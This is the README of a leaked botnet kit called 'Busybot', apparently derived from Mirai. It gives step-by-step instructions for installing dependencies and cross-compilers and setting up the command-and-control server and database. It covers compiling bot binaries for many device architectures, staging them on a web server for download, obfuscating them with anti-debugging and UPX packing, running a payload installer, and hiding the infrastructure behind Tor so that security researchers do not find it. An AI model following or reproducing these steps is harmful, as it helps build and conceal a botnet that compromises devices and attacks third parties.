~ Busybot (1.6.a)

 - This isn't done, i only leaked it cause:
   A. shit source
   B. learning C++
   C. reason for motivation

 ~ Features:
   - Good evasion for standard library functions
   - Custom memory allocation
   - Fresh new attack parser
   - /proc/$pid/exe locker

 ~ Requirements:
   - CNC (recommended)
     - Ubuntu (x86)
     - 4GB Ram
     - 2vCores
     - 100MB Portspeed

   - Scan (recommended)
     - Debian (x86)
     - 6GB Ram
     - 4vCores
     - 1GB Portspeed

 ~ [1.0] Dependency installation:
   ```
   apt-get install gcc electric-fence wget mysql-server mysql-client apache2 screen golang -y
   ```

 ~ [1.1] Cross compiler installation:
 ```
   mkdir /etc/xcompile
   cd /etc/xcompile
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
   wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
   tar -jxf cross-compiler-armv4l.tar.bz2
   tar -jxf cross-compiler-i586.tar.bz2
   tar -jxf cross-compiler-m68k.tar.bz2
   tar -jxf cross-compiler-mips.tar.bz2
   tar -jxf cross-compiler-mipsel.tar.bz2
   tar -jxf cross-compiler-powerpc.tar.bz2
   tar -jxf cross-compiler-sh4.tar.bz2
   tar -jxf cross-compiler-sparc.tar.bz2
   rm *.tar.bz2
   mv cross-compiler-armv4l armv4l
   mv cross-compiler-i586 i586
   mv cross-compiler-m68k m68k
   mv cross-compiler-mips mips
   mv cross-compiler-mipsel mipsel
   mv cross-compiler-powerpc powerpc
   mv cross-compiler-sh4 sh4   
   mv cross-compiler-sparc sparc
```

 ~ [1.2] Cross compiler setup:
 ```
   nano ~/.bashrc -> Paste in the following lines:
   export PATH=$PATH:/etc/xcompile/armv4l/bin
   export PATH=$PATH:/etc/xcompile/armv6l/bin
   export PATH=$PATH:/etc/xcompile/i586/bin
   export PATH=$PATH:/etc/xcompile/m68k/bin
   export PATH=$PATH:/etc/xcompile/mips/bin
   export PATH=$PATH:/etc/xcompile/mipsel/bin
   export PATH=$PATH:/etc/xcompile/powerpc/bin
   export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
   export PATH=$PATH:/etc/xcompile/sh4/bin
   export PATH=$PATH:/etc/xcompile/sparc/bin
   function compile_bot {
       "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
       "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
   }
```

~ [2.0] MySQL Setup:
```
   service mysql start
   mysql
```
     `USE mysql;`
     `ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password by 'mynewpassword';`
     `FLUSH PRIVILEGES;`
     `exit;`
```
   cat db.sql | mysql -pmynewpassword
```
 ~ [2.1] C&C Setup:
   - api/assets/config.json for editing the hosts
 
 ```
   cd api/
   go build
   rm -rf main.go core
   screen ./busybot
```

 ~ [2.3] Bot Setup:
   - tools/gen_keys.c for generating xor keus
   - tools/enc.c for encrypting strings
   - Change the domains in /bot/table.c (Set the domain to a onion domain if you want Tor)
   - Change the fake IP/Port in /bot/headers/includes.h
   - Change the SIP in /bot/headers/includes.h (single instance port)

```
   mkdir release/
   mkdir /var/www/html/bins
   compile_bot i586 x86 "-static"
   compile_bot mips mips "-static"
   compile_bot mipsel mpsl "-static"
   compile_bot armv4l arm "-static"
   compile_bot armv5l arm5n
   compile_bot armv6l arm7 "-static"
   compile_bot powerpc ppc "-static"
   compile_bot sparc spc "-static"
   compile_bot m68k m68k "-static"
   compile_bot sh4 sh4 "-static"
   compile_bot i586 dbg "-static -DDEBUG"
   cd release
   mv x86 mips mpsl arm arm5n arm7 ppc spc m68k sh4 /var/www/html/bins
```
 ~ [2.4] Elf corruption:
 ```
   gcc tools/anti_debug64.c -oantidbg64
   gcc tools/anti_debug32.c -oantidbg32
```
   => If the architecture is 32bit then use "antidbg32"
    > If the architecture is 64bit then use "antidbg64"
```
   ./antidbg64 release/<bin>
   ./antidbg32 release/<bin>
```
 ~ [2.5] UPX Packing:
```
   apt install upx -y
   upx -9 release/*
```

 ~ Payload installation (CentOS):
 ```
   yum install python2 python3 python3-pip python-pip -y
   python2 tools/payload.py
```

 ~ [3.0] Tor support:
   ~ Let's say you hate InfoSec/Journaling retards, and
     you don't want your botnet to be posted on krebs or
     MalwareMustDie, or stuff like that, what you could
     do is make your botnet completely decentralized and
     actually, busybot gives you complete support to do
     that, now you need 4 servers to do it, and follow
     along the steps.

```
   timedatectl set-timezone America/New_York
   apt install tor iptables ufw apt-transport-https -y

   ~ Now put the following lines in your repo list (/etc/apt/sources.list)
   deb http://deb.torproject.org/torproject.org focal main
   deb-src http://deb.torproject.org/torproject.org focal main

   wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
   apt update && apt upgrade -y
   apt install tor deb.torproject.org-keyring -y
   nano /etc/tor/torrc
   ~ Now paste the following lines or find them and uncomment them out
   Nickname NodeNick
   ORPort 8040
   ExitRelay 0
   SocksPort 0
   ControlSocket 0
   ContactInfo your@email.com

   systemctl restart tor@default
   ufw allow 22; ufw allow 443; ufw allow 80; ufw allow 53; ufw allow 21; ufw allow 23
   ufw enable
```

   ~ It's quite recommennded to copy the Tor node keys
```
   scp -r root@200.200.200.200:/var/lib/tor/keys ./
```

   ~ Now your Tor node is: <SERVER IP>:<8040>
     Do this again 4 times on different servers.
